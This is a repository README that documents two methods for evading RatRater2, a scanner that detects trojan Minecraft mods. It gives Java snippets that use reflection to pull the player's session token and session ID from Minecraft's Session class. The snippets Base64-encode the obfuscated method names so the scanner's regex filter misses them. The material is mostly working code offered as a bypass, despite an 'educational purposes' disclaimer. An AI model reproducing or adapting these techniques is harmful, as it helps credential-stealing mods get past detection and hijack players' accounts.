# RatRater 2 Bypass

This Repository contains 2 bypasses for [RatRater2].

## ⚠️ Disclaimer

**This program is for educational purposes only, and I am not responsible for any of your actions!** \
**If you use this to create a rat then you're a discussing human being!**

## Explanation

Short explanation of booth bypasses.

### 1st bypass (Fixed)

Extracting the token from `private final String token;` (`field_148258_c`) inside `net.minecraft.util.Session`.
(The methode was found by [@Commandcracker])

#### Example of bypass 1

```java
private static String getTokenFromField() {
    try {
        Field token_field = Session.class.getDeclaredField("field_148258_c");
        token_field.setAccessible(true);
        return (String) token_field.get(Minecraft.getMinecraft().getSession());
    } catch (NoSuchFieldException | IllegalAccessException ignore) {
        return "";
    }
}
```

### 2nd bypass

Hiding the Function/Field Name from the regex filter by for example
Encoding/Encrypting and Decoding/Decrypting or
by combining two variables to the name of one of:

```
func_111286_b (getSessionID)
func_148254_d (getToken)
field_148258_c (token)
```

and then using reflection to access it.

#### Encoding Example of bypass 2 with func_111286_b (getSessionID)

```java
private static String getSessionIDFromGetSessionID() {
    try {
        byte[] decodedBytes = Base64.getDecoder().decode("ZnVuY18xMTEyODZfYg==");
        String decodedString = new String(decodedBytes);
        Method getSessionID = Session.class.getMethod(decodedString);
        return (String) getSessionID.invoke(Minecraft.getMinecraft().getSession());
    } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException ignore) {
        return "";
    }
}
```

#### Encoding Example of bypass 2 with func_148254_d (getToken)

```java
private static String getTokenFromGetToken() {
    try {
        byte[] decodedBytes = Base64.getDecoder().decode("ZnVuY18xNDgyNTRfZA==");
        String decodedString = new String(decodedBytes);
        Method getSessionID = Session.class.getMethod(decodedString);
        return (String) getSessionID.invoke(Minecraft.getMinecraft().getSession());
    } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException ignore) {
        return "";
    }
}
```

[RatRater2]: https://github.com/KTibow/RatRater2
[@Commandcracker]: https://github.com/Commandcracker
